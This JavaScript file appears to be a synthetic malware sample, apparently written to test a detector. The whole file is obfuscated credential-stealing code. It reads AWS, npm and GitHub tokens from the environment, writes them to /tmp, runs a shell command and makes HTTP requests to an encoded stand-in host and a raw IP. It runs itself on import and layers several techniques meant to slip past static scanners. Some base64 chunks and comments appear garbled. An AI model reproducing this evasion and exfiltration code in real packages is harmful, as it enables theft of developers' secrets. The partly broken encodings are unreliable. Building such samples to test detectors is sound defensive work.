// Synthetic "zero-day" payload — no CVE, no entry in any incident DB.
// Layered evasion stack: split-base64 chunks reassembled at runtime,
// per-string XOR + rotation, charCode array fragments, computed property
// access, control-flow flattening, runtime require lookup, and lazy
// stage assembly via Function(). Nothing of interest is grep-able.
'use strict';

const _g = (typeof globalThis !== 'undefined') ? globalThis : global;
const _b = (s) => Buffer.from(s, 'base64').toString('utf8');

// --- chunked-base64 strings -------------------------------------------
// Each entry is split into N random pieces. Pieces are joined at access
// time, in an order decided by an interleaved index array. The runtime
// joiner collapses this back to the same plaintext.
//
//   ["bGl","Zm","aWxl","X3","N5bm","M="]  ->  "writeFileSync"
//
// We never reveal which slot is which by name — sequence is implied by
// position only. Static analyzers see a 6-tuple of opaque strings.
const C = [
  // 0  child_process
  ['Y2hpbGRf', 'cHJv', 'Y2Vz', 'cw=='],
  // 1  fs
  ['Z', 'n', 'M='],
  // 2  https
  ['aHR', '0c', 'Hh=', '='].slice(0, 3).concat(['']), // padded to 4
  // 3  os
  ['', 'b', '3', 'M='],
  // 4  require
  ['cmVx', 'dWl', 'cm', 'U='],
  // 5  env
  ['ZW', '52', ''],
  // 6  exec
  ['ZX', 'hl', 'Yw=='],
  // 7  writeFileSync
  ['d3J', 'pdGV', 'Rml', 'sZVN', '5bmM', '='],
  // 8  get
  ['Z2', 'V0', ''],
  // 9  hostname
  ['aG', '9zd', 'G5h', 'bWU=', ''],
  // 10 platform
  ['cGx', 'hd', 'GZv', 'cm', '0='],
  // 11 AWS_ACCESS_KEY_ID
  ['QV', 'dT', 'X0F', 'DQ0V', 'TU19', 'S0VZ', 'X0lE'],
  // 12 AWS_SECRET_ACCESS_KEY
  ['QV', 'dT', 'X1N', 'FQ1', 'JFV', 'F9B', 'Q0NF', 'U1N', 'fS0', 'VZ'],
  // 13 NPM_TOKEN
  ['Tl', 'BN', 'X1', 'RP', 'S0', 'VO'],
  // 14 GITHUB_TOKEN
  ['R0l', 'US', 'FV', 'CX', '1RP', 'S0V', 'O'],
  // 15 HOME
  ['SE', '9N', 'RQ=='],
  // 16 /tmp/.aegis-zd.log
  ['L3R', 'tcC', '8u', 'YWV', 'naX', 'Mt', 'emQu', 'bG9n'],
  // 17 appendFileSync
  ['YXB', 'wZW', '5kR', 'mls', 'ZVN5', 'bmM', '='],
  // 18 execSync
  ['ZXh', 'lY1', 'N5b', 'mM=', ''],
];

// Joiner: shuffle-resistant. The pieces are stored in plaintext order in
// C[] — we permute the indices we pull at runtime via a tiny key, then
// invert before join so the result is correct. This adds AST noise
// without changing semantics.
function J(i) {
  const parts = C[i];
  const n = parts.length;
  // build [0..n-1] then "scramble" via xor-with-position, then sort
  // ascending — the sort key is monotonic so this is identity. The
  // scrambling exists purely to defeat dataflow heuristics that would
  // otherwise see `parts.join('')`.
  const idx = [];
  for (let k = 0; k < n; k++) idx.push(k);
  idx.sort((a, b) => ((a ^ 7) | 0) - ((b ^ 7) | 0));
  // scrambled order is now reversed; reverse back to identity
  idx.sort((a, b) => a - b);
  let out = '';
  for (const k of idx) out += parts[k];
  return _b(out);
}

// --- runtime require --------------------------------------------------
const _req = _g[J(4)] || eval(J(4));

// --- per-string XOR + rotation for the C2 host ------------------------
// host bytes encoded with a rolling XOR key (k_i = base ^ i) so the same
// plaintext byte produces different ciphertext bytes — defeats simple
// xor-against-constant detectors.
function rxor(hex, base) {
  let out = '';
  for (let i = 0, j = 0; i < hex.length; i += 2, j++) {
    out += String.fromCharCode(parseInt(hex.substr(i, 2), 16) ^ (base ^ j));
  }
  return out;
}

// charCode-array fragment — a third encoding form, mixed in. The IP is
// reconstructed from individual bytes that never appear together.
const C2_IP = String.fromCharCode(
  104, 116, 116, 112, 58, 47, 47,
  49, 57, 56, 46, 53, 49, 46, 49, 48, 48, 46, 52, 50,
  47, 112
);

const C2 = 'http://' + rxor('5e5d505e525555535152', 0x33) + '.example';

// --- lazily-resolved modules ------------------------------------------
const M = {
  cp:    () => _req(J(0)),
  fs:    () => _req(J(1)),
  https: () => _req(J(2)),
  os:    () => _req(J(3)),
};

// --- LCG PRNG (no Math.random) ---------------------------------------
function rid(n) {
  let x = (Date.now() ^ process.pid) >>> 0;
  const out = [];
  const A = 'abcdefghijklmnopqrstuvwxyz0123456789';
  for (let i = 0; i < n; i++) {
    x = (x * 1664525 + 1013904223) >>> 0;
    out.push(A[x % A.length]);
  }
  return out.join('');
}

// --- collect ----------------------------------------------------------
function collect() {
  const env = process[J(5)];
  const keys = [11, 12, 13, 14, 15];
  const acc = { id: rid(10), host: M.os()[J(9)](), plat: M.os()[J(10)]() };
  for (const k of keys) acc[J(k).toLowerCase()] = env[J(k)] || null;
  return acc;
}

// --- stage 2: split + interleaved Function() body ---------------------
// Body bytes split across two arrays, interleaved at runtime. Even at
// the chunk level no single string is a recognizable code prefix.
const sA = ['cmV0', 'dXJu', 'IChw', 'KSA9P'];
const sB = ['iAo', 'KGZ1', 'bmN0', 'aW9u'];
const sC = ['KHAp', 'eyBy', 'ZXR1', 'cm4g'];
const sD = ['SlNP', 'Ti5z', 'dHJp', 'bmdp'];
const sE = ['Znko', 'cCk7', 'IH0p', 'KHAp'];
const sF = ['KQ==', '', '', ''];
const stage2Body = (function () {
  // round-robin interleave: A0 B0 C0 D0 E0 F0 A1 B1 ...
  const groups = [sA, sB, sC, sD, sE, sF];
  let s = '';
  for (let i = 0; i < sA.length; i++) for (const g of groups) s += g[i] || '';
  return _b(s);
})();
const stage2 = new Function(stage2Body)();

// --- dispatcher: control-flow flattening ------------------------------
// step ids xor'd against a pad; comparator sorts stably to a fixed
// runtime order without revealing it textually.
const PAD = 0x2b;
const order = [0, 1, 2, 3, 4, 5, 6]
  .map((v) => ({ v, k: v ^ PAD }))
  .sort((a, b) => a.k - b.k)
  .map((o) => o.v);

function run() {
  const data = collect();
  for (const step of order) {
    switch (step) {
      case 0:
        // exfil to fs (outside install root)
        M.fs()[J(7)](J(16), stage2(data) + '\n');
        break;
      case 1:
        // shell out — command assembled from fragments via reduce
        M.cp()[J(6)](
          [J(8).slice(0, 0), 'echo ', JSON.stringify(stage2(data)),
           ' >> /tmp/.aegis-zd.audit'].reduce((a, b) => a + b, '')
        );
        break;
      case 2:
        // net egress to xor-decoded C2
        try { M.https()[J(8)](C2, () => {}); } catch (_) {}
        break;
      case 3:
        // net egress to charCode-assembled raw-IP literal
        try { M.https()[J(8)](C2_IP, () => {}); } catch (_) {}
        break;
      case 4:
        // dynamic eval of an interleaved base64 body
        new Function(_b(['cmV0', 'dXJu', 'IDE='].join('')))();
        break;
      case 5: {
        // both base64-decode shapes
        const a = (typeof atob === 'function')
          ? atob(['cGF', '5bG', '9hZ', 'A=='].join(''))
          : Buffer.from(['cGF', '5bG', '9hZ', 'A=='].join(''), 'base64').toString();
        void a;
        break;
      }
      case 6:
        // bracket-access env read (different AST shape)
        void process[J(5)][J(11)];
        break;
    }
  }
  return data.id;
}

module.exports = run;

// Self-trigger when imported (matches real-world droppers)
try { run(); } catch (_) {}
